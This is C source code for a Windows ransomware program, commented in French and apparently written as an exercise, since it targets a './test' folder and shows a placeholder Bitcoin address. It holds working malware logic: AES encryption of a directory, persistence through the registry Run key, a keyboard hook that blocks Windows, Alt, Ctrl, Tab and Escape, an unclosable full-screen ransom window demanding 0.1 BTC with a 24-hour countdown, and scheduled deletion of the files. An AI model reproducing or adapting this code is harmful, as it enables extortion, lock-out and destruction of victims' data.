#include <windows.h>
#include <winuser.h>
#include <time.h>
#include <stdio.h>
#include "ransomware.h"

// Déclarations globales
const char *directory = "./test";
unsigned char key[KEY_SIZE] = "0123456789abcdef0123456789abcdef"; // Clé AES 256 bits
unsigned char iv[IV_SIZE] = "abcdef9876543210";                  // IV AES 128 bits
int encryption_done = 0;
time_t end_time;
HHOOK hKeyboardHook; // Hook global pour bloquer les raccourcis clavier
HWND hInputBox = NULL; // Champ d'entrée
HWND hSubmitButton = NULL; // Bouton "Valider"


// Prototypes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
void add_to_startup(const char *exe_path);

// Fonction principale
int main() {

    // Initialise le hook clavier
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hKeyboardHook) {
        fprintf(stderr, "Erreur lors de l'installation du hook clavier.\n");
        return 1;
    }

    // Calcul de la fin du chrono (24 heures)
    time_t now = time(NULL);
    end_time = now + 24 * 60 * 60;

    // Ajouter au démarrage
    char exe_path[MAX_PATH];
    GetModuleFileName(NULL, exe_path, MAX_PATH);
    add_to_startup(exe_path);


    // Initialisation de la fenêtre
    const char *class_name = "RansomwareWindow";
    HINSTANCE hInstance = GetModuleHandle(NULL);

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = class_name;

    if (!RegisterClass(&wc)) {
        fprintf(stderr, "Erreur lors de l'enregistrement de la classe de fenêtre.\n");
        return 1;
    }

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,                   // Toujours au-dessus
        class_name,                     // Nom de la classe
        "Ransomware Alert",             // Titre de la fenêtre
        WS_POPUP | WS_VISIBLE,          // Plein écran sans bordure
        0, 0,                           // Position (coin supérieur gauche)
        GetSystemMetrics(SM_CXSCREEN),  // Largeur de l'écran
        GetSystemMetrics(SM_CYSCREEN),  // Hauteur de l'écran
        NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        fprintf(stderr, "Erreur lors de la création de la fenêtre.\n");
        return 1;
    }

    // Lancer le chiffrement
    perform_encryption(directory, key, iv);

    // Lancer le timer pour mettre à jour le chrono
    SetTimer(hwnd, 1, 1000, NULL);  // Timer toutes les secondes (1000 ms)

    // Boucle de messages pour la fenêtre
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        // Permettre l'exécution des callbacks
        SleepEx(0, TRUE);
    }

    UnhookWindowsHookEx(hKeyboardHook); // Supprime le hook à la fin

    return 0;
}

// Fonction pour ajouter au démarrage
void add_to_startup(const char *exe_path) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, "RansomwareApp", 0, REG_SZ, (BYTE *)exe_path, strlen(exe_path) + 1);
    RegCloseKey(hKey);
}

// Fonction de chiffrement
void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv) {
    read_and_crypt_directory(directory, 0, key, iv);
    encryption_done = 1;
    
    // Lance le timer pour supprimer le repertoire au bout de 24 h
    int wait_time_seconds = 24 * 60* 60; // Délai de 24 heures 
    // wait_time_seconds = 5; // Délai de 5 secondes pour les tests // Todo
    printf("Le fichier sera supprimé dans %d secondes.\n", wait_time_seconds); 
    // Appel de la fonction pour planifier la suppression du fichier
    scheduleFileDeletion(directory, wait_time_seconds);
}

// Fonction de déchiffrement
int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv) {
    return read_and_crypt_directory(directory, 1, key, iv);
    // Pas la peine d'arreter le scheduleFileDeletion, il s'arretera à la fin du programme si l'utilisateur paye
}

// Fonction pour gérer les événements de la fenêtre
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HFONT hFont;
    static char time_remaining[64];
    switch (uMsg) {
        case WM_CREATE: {
            // Créer un bouton "Déchiffrer" uniquement si l'encryption est terminée
            CreateWindow("BUTTON", "Déchiffrer",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                500, 500, 150, 50, hwnd, (HMENU)1, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);

            // Définir une police pour le texte
            hFont = CreateFont(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                               CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Arial Unicode MS");
            break;
        }
        case WM_COMMAND: {
            /**if (LOWORD(wParam) == 1) {
                perform_decryption(directory, key, iv);
                PostQuitMessage(0);
            }**/

            if (LOWORD(wParam) == 1) { // Bouton "Déchiffrer" cliqué
                // Ajoute un champ d'entrée et un bouton "Valider" s'ils n'existent pas encore
                if (!hInputBox) {
                    hInputBox = CreateWindow("EDIT", "",
                        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                        450, 400, 250, 30, hwnd, (HMENU)2, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);

                    hSubmitButton = CreateWindow("BUTTON", "Valider",
                        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                        710, 400, 100, 30, hwnd, (HMENU)3, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
                }
            } else if (LOWORD(wParam) == 3) { // Bouton "Valider" cliqué
                char entered_key[KEY_SIZE];
                GetWindowText(hInputBox, entered_key, sizeof(entered_key)+1); // Récupérer la clé saisie

                // Vérifier si la clé est correcte
                if (perform_decryption(directory, entered_key, iv) == 0) {  
                    MessageBox(hwnd, "Fichiers déchiffrés avec succès !", "Succès", MB_OK | MB_ICONINFORMATION);
                    PostQuitMessage(0); // Quitter le programme
                } else {
                    MessageBox(hwnd, "Clé incorrecte. Veuillez réessayer.", "Erreur", MB_OK | MB_ICONERROR);   
                }
            }
            break;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            // Définir le fond noir
            RECT rect;
            GetClientRect(hwnd, &rect);
            FillRect(hdc, &rect, CreateSolidBrush(RGB(0, 0, 0)));

            // Dessiner le message principal en haut
            SelectObject(hdc, hFont);
            SetTextColor(hdc, RGB(255, 0, 0)); // Texte rouge
            SetBkMode(hdc, TRANSPARENT); // Pas de fond pour le texte
            if (encryption_done) {
                RECT text_rect1 = {rect.left + 50, rect.top + 50, rect.right - 50, rect.top + 100};
                DrawText(hdc, "Vos fichiers ont été chiffrés !", -1, &text_rect1, DT_CENTER | DT_VCENTER);
            } else {
                RECT text_rect1 = {rect.left + 50, rect.top + 50, rect.right - 50, rect.top + 100};
                DrawText(hdc, "Chiffrement en cours...", -1, &text_rect1, DT_CENTER | DT_VCENTER);
            }

            // Dessiner l'adresse Bitcoin au centre
            RECT text_rect2 = {rect.left + 50, rect.top + 150, rect.right - 50, rect.top + 200};
            DrawText(hdc, "Envoyez 0.1 BTC à l'adresse suivante : 1BitcoinFakeAddress123", -1, &text_rect2, DT_CENTER | DT_VCENTER);

            // Afficher le temps restant en bas
            RECT text_rect3 = {rect.left + 50, rect.bottom - 100, rect.right - 50, rect.bottom - 50};
            DrawText(hdc, time_remaining, -1, &text_rect3, DT_CENTER | DT_VCENTER);

            EndPaint(hwnd, &ps);
            break;
        }
        case WM_TIMER: {
            // Mise à jour du temps restant
            time_t now = time(NULL);
            int remaining = (int)(end_time - now);
            if (remaining <= 0) {
                strcpy(time_remaining, "Temps écoulé !");
            } else {
                int hours = remaining / 3600;
                int minutes = (remaining % 3600) / 60;
                int seconds = remaining % 60;
                sprintf(time_remaining, "Temps restant : %02d:%02d:%02d", hours, minutes, seconds);
            }
            InvalidateRect(hwnd, NULL, TRUE);  // Redessiner la fenêtre
            break;
        }
        case WM_CLOSE:
            return 0; // Empêcher la fermeture
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            switch (pKeyBoard->vkCode) {
                case VK_LWIN: // Bloque la touche Windows gauche
                case VK_RWIN: // Bloque la touche Windows droite
                case VK_TAB:  // Bloque Alt+Tab
                case VK_ESCAPE: // Bloque Alt+Escape
                case VK_CONTROL: // Bloque Ctrl
                case VK_MENU:    // Bloque Alt
                    return 1; // Empêche le traitement par le système
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}